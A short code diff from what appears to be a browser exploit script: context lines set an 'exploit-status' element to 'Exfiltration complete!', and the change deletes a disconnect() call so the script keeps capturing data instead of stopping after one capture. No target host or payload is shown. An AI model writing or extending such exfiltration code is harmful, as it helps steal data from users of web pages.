@@ -71,9 +71,6 @@
                     }).then(() => {
                         document.getElementById('exploit-status').innerText = "Exfiltration complete!";
                     });
-                    
-                    // Stop observing after one capture
-                    disconnect();
                 }
             }, 2000);
         }, 7000);
